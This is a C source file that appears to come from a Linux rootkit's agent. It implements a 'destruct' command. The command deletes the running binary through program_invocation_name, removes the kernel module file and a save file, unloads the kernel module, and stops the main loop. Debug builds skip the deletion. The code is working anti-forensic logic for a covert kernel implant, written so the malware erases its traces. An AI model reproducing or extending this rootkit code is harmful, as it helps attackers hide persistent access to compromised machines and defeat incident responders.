#define _GNU_SOURCE

#include "../inc/kernel.h"
#include "../inc/cmds.h"
#include "../inc/save.h"
#include "../inc/util.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

/*

 * first it deletes the kernel module, the save file and itself
 * then it unloads the kernel module
 * lastly sets "should_quit" to break the main loop 

*/

// see main.c
extern bool should_quit;

char *cmd_destruct(job_t *job) {
  cmd_recv_all(job);

  // no need to delete anything in debug mod
  if(SHRK_DEBUG)
    goto end;

  /*

   * i didnt even know this was a thing, but apperantly "program_invocation_name"
   * is global variable for argv[0] which is kinda neat for us

  */
  if(unlink(program_invocation_name) != 0){
    debug_err("failed to unlink the self");
    return strerror(errno);
  }

  // next, lets remove the kernel module
  if(unlink(SHRK_MODULE) != 0){
    debug_err("failed to unlink the kernel module");
    return strerror(errno);
  }

  // after that, remove the save file
  save_remove();

  // lastly unload the kernel module
  if(!kernel_unload()){
    debug("failed to unload the module");
    return strerror(errno);
  }

end:
  should_quit = true;
  return "success";
}
